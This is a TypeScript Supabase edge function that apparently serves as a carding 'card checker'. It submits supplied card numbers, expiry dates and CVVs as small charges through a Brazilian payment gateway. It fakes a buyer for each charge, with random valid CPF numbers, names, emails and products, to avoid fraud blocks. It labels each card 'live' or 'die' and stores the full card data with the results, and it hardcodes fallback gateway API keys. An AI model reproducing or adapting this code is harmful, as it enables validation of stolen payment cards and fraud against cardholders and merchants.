import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import { encode } from 'https://deno.land/std@0.168.0/encoding/base64.ts';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    gatewayUrl?: string; // Mantido para compatibilidade, mas ignorado ou usado como log
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
    token?: string;
}

// ========================================
// CONFIGURAÇÃO BLACK CAT (Chaves fornecidas)
// ========================================
const BLACKCAT_PUBLIC_KEY = Deno.env.get('BLACKCAT_PUBLIC_KEY') || 'pk_zjH0069PkZun7luIdDfKlu7Z6VkYud0DgM6HNerlfRk9RuZh';
const BLACKCAT_SECRET_KEY = Deno.env.get('BLACKCAT_SECRET_KEY') || 'sk_atvi-Vbu7A490IU8UbzdP-mSdHyVcMTlnRiO6bH7vZpbyTZy';
const BLACKCAT_API_URL = 'https://api.blackcatpagamentos.com/v1';

// ========================================
// GERAÇÃO DE DADOS (Anti-Bloqueio)
// ========================================

function generateCPF(): string {
    const randomDigit = () => Math.floor(Math.random() * 10);
    const cpf = Array.from({ length: 9 }, randomDigit);
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += cpf[i] * (10 - i);
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit1);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += cpf[i] * (11 - i);
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit2);
    return cpf.join('');
}

const firstNames = ['João', 'Maria', 'José', 'Ana', 'Pedro', 'Juliana', 'Carlos', 'Fernanda', 'Paulo', 'Mariana', 'Lucas', 'Beatriz', 'Rafael', 'Camila', 'Felipe', 'Amanda'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Ferreira', 'Rodrigues', 'Almeida', 'Nascimento', 'Pereira', 'Carvalho'];

function generateCustomerData() {
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const randomNum = Math.floor(Math.random() * 9000) + 1000;

    return {
        name: `${firstName} ${lastName}`,
        email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}@gmail.com`,
        phoneNumber: `119${Math.floor(10000000 + Math.random() * 90000000)}`,
        documentNumber: generateCPF(),
        address: {
            street: 'Rua das Flores',
            number: Math.floor(Math.random() * 999) + 1,
            neighborhood: 'Centro',
            city: 'São Paulo',
            state: 'SP',
            zipCode: '01001000' // Numeros apenas
        }
    };
}

// ... (Customer data generation above)

const productNames = ['Curso de Marketing Digital', 'E-book Receitas', 'Mentoria Online', 'Assinatura Premium', 'Kit Ferramentas', 'Workshop Exclusivo', 'Acesso Vitalício', 'Pacote de Design'];

function generateProductData(amountInCents: number) {
    const productName = productNames[Math.floor(Math.random() * productNames.length)];
    return {
        name: productName,
        unitPrice: amountInCents,
        quantity: 1,
        tangible: false
    };
}

// ...

async function processBlackCatSale(cardData: TestCardRequest) {
    console.log('🐈 Processing Black Cat Payment...');

    const customerData = generateCustomerData();
    // Default amount 100 cents (R$ 1.00) if not provided. Black Cat expects integer cents.
    // If cardData.amount is regular float (e.g. 1.00), multiply by 100.
    // Assuming cardData.amount coming from frontend might be float 1.50 etc.
    const amountInCents = cardData.amount ? Math.round(cardData.amount * 100) : 100;

    const productData = generateProductData(amountInCents);

    const authHeader = `Basic ${encode(`${BLACKCAT_PUBLIC_KEY}:${BLACKCAT_SECRET_KEY}`)}`;

    const payload = {
        amount: amountInCents,
        paymentMethod: "credit_card",
        installments: 1,
        card: {
            holderName: customerData.name.toUpperCase(),
            number: cardData.cardNumber.replace(/\D/g, ''),
            expirationMonth: parseInt(cardData.expMonth),
            expirationYear: parseInt(cardData.expYear.slice(-2)),
            cvv: cardData.cvv
        },
        customer: {
            name: customerData.name,
            email: customerData.email,
            documentNumber: customerData.documentNumber,
            phoneNumber: customerData.phoneNumber,
            address: {
                street: customerData.address.street,
                number: customerData.address.number,
                neighborhood: customerData.address.neighborhood,
                city: customerData.address.city,
                state: customerData.address.state,
                zipCode: customerData.address.zipCode
            }
        },
        items: [
            {
                title: productData.name,
                unitPrice: productData.unitPrice,
                quantity: productData.quantity,
                tangible: productData.tangible
            }
        ],
        description: `Pagamento de ${productData.name}`
    };

    console.log('📤 Payload:', JSON.stringify(payload, null, 2));

    try {
        const response = await fetch(`${BLACKCAT_API_URL}/transactions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': authHeader
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log(`📥 API Response [${response.status}]:`, JSON.stringify(data));

        let status = 'die';
        // Mapeamento de resposta Black Cat
        // Sucesso geralmente é 200/201. Status dentro do body: "paid", "authorized" etc.
        // Baseado em gateways similares (Pagar.me/Mundipagg/etc), e doc lida:
        // Ajustar conforme payload real retornado.
        if (response.ok) {
            const txStatus = data.status?.toLowerCase();
            if (['paid', 'authorized', 'captured'].includes(txStatus)) {
                status = 'live';
            } else if (txStatus === 'refused' || txStatus === 'failed') {
                status = 'die';
            } else {
                // Pode ser pending ou processing, tratamos como unknown ou die no contexto de checker?
                // Checkers geralmente querem saber se passou na hora.
                status = 'unknown';
            }
        } else {
            // Erro na requisição (400, 401, etc)
            if (data.message && data.message.toLowerCase().includes('recusado')) {
                status = 'die';
            } else {
                status = 'die'; // Default p/ erro assumimos falha
            }
        }

        return {
            success: true,
            status: status,
            message: data.message || data.status || 'Transaction processed',
            raw: data
        };

    } catch (error: any) {
        console.error('❌ Black Cat Request Error:', error.message);
        return {
            success: false,
            status: 'error',
            message: error.message,
            raw: null
        };
    }
}

// ========================================
// MAIN HANDLER
// ========================================

serve(async (req) => {
    if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });

    try {
        const supabaseClient = createClient(
            Deno.env.get('SUPABASE_URL') ?? '',
            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
        );

        const requestData: TestCardRequest = await req.json();
        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = requestData;

        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv) {
            return new Response(JSON.stringify({ error: 'Missing fields' }), { status: 400, headers: corsHeaders });
        }

        const startTime = Date.now();

        // FORCED to Black Cat for migration
        const gatewayUsed = 'BLACK_CAT';
        const result = await processBlackCatSale(requestData);

        // Normalize response for frontend
        const finalResult = {
            status: result.status,
            message: result.message,
            amount: amount || 0,
            responseTimeMs: Date.now() - startTime
        };

        // Salva resultado
        await supabaseClient.from('card_test_results').insert([{
            session_id: sessionId,
            card_number: cardNumber,
            exp_month: expMonth,
            exp_year: expYear,
            cvv: cvv,
            gateway_url: gatewayUsed,
            processing_order: processingOrder,
            status: finalResult.status,
            message: finalResult.message,
            amount: finalResult.amount,
            response_time_ms: finalResult.responseTimeMs
        }]);

        return new Response(
            JSON.stringify({ success: true, testResult: finalResult }),
            { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );

    } catch (error: any) {
        console.error('💥 Critical Error:', error);
        return new Response(
            JSON.stringify({ error: error.message }),
            { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
    }
});
